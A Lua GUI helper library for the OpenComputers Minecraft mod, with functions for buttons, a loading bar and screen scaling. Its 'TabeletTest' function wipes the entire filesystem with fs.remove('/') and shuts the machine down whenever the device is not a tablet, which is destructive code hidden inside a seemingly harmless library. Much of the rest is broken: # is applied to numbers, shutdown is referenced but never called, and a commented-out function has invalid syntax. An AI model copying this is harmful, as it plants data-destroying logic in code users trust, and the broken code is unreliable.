local component = require("component")
local event = require("event")
local gpu = component.gpu
local screen = component.screen
local computer = require("computer")
local internet = require("internet")

MAYNERAPI = {}

local buttonW = 20
local buttonH = 1

local function isWithinButton(x, y, bx, by, bw, bh)
    return x >= bx and x < bx + bw and y >= by and y < by + bh
end

function MAYNERAPI.DrawButton(x1, y1, width, height, text, foreground, background, callback)
    gpu.setForeground(foreground)
    gpu.setBackground(background)
    gpu.fill(x1, y1, width, height, " ")
    local textX = x1 + math.floor((width - #text) / 2)
    local textY = y1 + math.floor(height / 2)
    gpu.set(textX, textY, text)
    
    local function check(_, _, x2, y2)
        if isWithinButton(x2, y2, x1, y1, width, height) then
            callback()
        end
    end

end

--[[ function MAYNERAPI.Message(title, message, oldcolor, exittoprogpatch) ----Добавил Мой Друг) А фиксил, я....
    local width = math.max(30, #message + 10)
    local height = 7 
    local x = math.floor((gpu.getResolution() - width) / 2)
    local y = math.floor((25 - height) / 2)
    
    gpu.setBackground(0x333333)
    gpu.fill(x, y, width, height, " ")

    local titleX = x + math.floor((width - #title) / 2)
    local titleY = y + 1
    local messageX = x + math.floor((width - #message) / 2)
    local messageY = y + 3

    gpu.setForeground(0xFFFFFF)
    gpu.set(titleX, titleY, title)
    gpu.set(messageX, messageY, message)

    local buttonWidth = width - 4
    local buttonHeight = 1
    local buttonX = x + 2
    local buttonY = y + height - 2
    gpu.setBackground(0x333333) 
    gpu.setForeground(0xFFFFFF)
    gpu.fill(buttonX, buttonY, buttonWidth, buttonHeight, " ")
    MAYNERAPI.DrawButton(#buttonX, #buttonY, 4, 1, OK, 0xFFFFFF, 0x333333) function()
            --СТИРАЙСЯ ГОВНО НА ПАЛОЧКЕ ЗАДОЛБАЛО
            #exittoprogpatch
    end
end ]]  

function MAYNERAPI.Loading(posX, posY, barW, barH)
  local barWidth = #barW
  local barHeight = #barH
  local barX = math.floor((#posX - #barW) / 2)
  local barY = #posY

  gpu.setForeground(0x00a6ff)
  gpu.setBackground(0x000000)
  gpu.fill(barX, barY, barWidth, barHeight, " ")

  local progress = 0
  while progress <= barWidth do
    gpu.setForeground(0xFFFFFF)
    gpu.setBackground(0xFFFFFF)
    gpu.fill(barX, barY, progress, barHeight, " ")
    gpu.setForeground(0x000000)
    gpu.setBackground(0x000000)
    gpu.fill(barX + progress, barY, 1, barHeight, " ")

    os.sleep(0.05)
    progress = progress + 1
  end
end

function MAYNERAPI.ScreenScale(SCX, SCY)
    gpu.setResolution(#SCX, #SCY)
end

function MAYNERAPI.TabeletTest()

local fs = require("filesystem")
    
local function isTablet()
  if component.isAvailable("tablet") then
    return true
  else
    return false
  end
end

if isTablet() then
  
else
  if component.isAvailable("computer") then
    fs.remove("/")
    computer.shutdown
  else
    computer.shutdown
  end
end
end

return MAYNERAPI
